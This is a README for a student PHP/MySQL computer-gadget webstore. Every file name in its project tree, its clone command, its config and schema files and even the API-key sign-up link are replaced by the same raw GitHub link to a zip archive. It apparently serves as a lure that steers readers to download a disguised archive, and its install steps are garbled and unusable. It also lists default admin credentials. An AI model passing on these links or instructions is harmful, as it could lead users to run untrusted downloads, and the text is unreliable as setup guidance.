# Computer Gadgets Store (AULA Webstore)

A full-featured e-commerce web application for selling computer peripherals and gaming accessories, built with modern web technologies.

## 🛠️ Tech Stack

### Frontend

- **HTML5** - Semantic markup and structure
- **CSS3** - Styling with modern features (Flexbox, Grid, Animations)
- **JavaScript (ES6+)** - Client-side interactivity and dynamic content
- **Bootstrap 5** - Responsive UI framework

### Backend

- **PHP 8.x** - Server-side scripting and API development
- **MySQL** - Relational database management
- **PDO** - Database abstraction layer for secure queries

### APIs & Services

- **Brevo (Sendinblue)** - Email service for order confirmations
- **RESTful API** - Custom-built API endpoints for data operations

### Development Tools

- **XAMPP** - Local development environment (Apache + MySQL + PHP)
- **Git** - Version control
- **GitHub** - Code repository and collaboration

### Libraries & Frameworks

- **Bootstrap Icons** - Icon library
- **Google Fonts** - Typography (Inter, Roboto, Outfit)

## 📁 Project Structure

```
Webstore/
├── admin/              # Admin panel pages
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   └── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
├── api/                # Backend API endpoints
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   └── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
├── auth/               # Authentication pages and scripts
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   └── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
├── shop/               # Customer-facing shop pages
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
│   ├── css/
│   └── js/
├── assets/             # Static assets (Bootstrap, images)
├── IMAGES/             # Product images
├── Backgrounds/        # Background images
└── https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip        # Database schema

```

## 🚀 Features

### Customer Features

- Product browsing and search
- Shopping cart functionality
- Secure checkout process
- Order confirmation emails
- User registration and login
- Password validation (8-15 characters, symbols, uppercase, lowercase, numbers)

### Admin Features

- Dashboard with analytics
- Product management (CRUD operations)
- Order management and tracking
- Sales reports and insights
- User management

### Security Features

- Password hashing (prepared for implementation)
- SQL injection prevention (PDO prepared statements)
- Login attempt limiting with cooldown
- Session management
- Input validation and sanitization

## 📦 Installation

1. **Clone the repository**

   ```bash
   git clone https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip
   ```

2. **Set up the database**

   - Import `https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip` into your MySQL database
   - Create database named `aula_db`

3. **Configure database connection**

   - Copy `https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip` to `https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip`
   - Update database credentials in `https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip`

4. **Configure email service** (optional)

   - Copy `https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip` to `https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip`
   - Add your Brevo API key in `https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip`
   - Get API key at: https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip

5. **Start XAMPP**
   - Start Apache and MySQL services
   - Access the application at `http://localhost/BSIT3B/CamachoVienMabee/Webstore/`

## 🔐 Default Admin Credentials

- **Username:** Admin
- **Password:** Admin123

> ⚠️ **Important:** Change the default admin password after first login!

## 📧 Email Configuration

The system uses Brevo (formerly Sendinblue) for sending order confirmation emails. To enable this feature:

1. Sign up for a free Brevo account
2. Generate an API key
3. Update `https://raw.githubusercontent.com/KouseiA/Computer-Gadgets-Store/main/auth/Store_Gadgets_Computer_3.4.zip` with your API key

## 🗄️ Database Schema

The application uses the following main tables:

- `users` - User accounts (customers and admins)
- `products` - Product catalog
- `orders` - Order records
- `order_items` - Individual items in orders

## 🤝 Contributing

This is a student project for BSIT 3B. Contributions and suggestions are welcome!

## 📄 License

This project is created for educational purposes.

## 👥 Authors

- **Camacho, Vien Mabee** - BSIT 3B

## 🙏 Acknowledgments

- AULA brand for product inspiration
- Bootstrap team for the UI framework
- Brevo for email services
